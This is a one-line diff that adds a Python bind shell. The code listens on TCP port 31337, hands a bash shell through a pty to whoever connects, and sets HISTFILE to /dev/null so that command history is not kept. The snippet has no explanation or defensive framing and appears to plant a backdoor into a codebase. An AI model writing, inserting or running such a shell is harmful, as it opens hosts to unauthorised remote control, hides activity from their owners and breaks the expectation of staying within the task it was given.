@@ -1,0 +1,1 @@
+import os;import pty;import socket;lport=31337;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',lport));s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/bash");s.close()
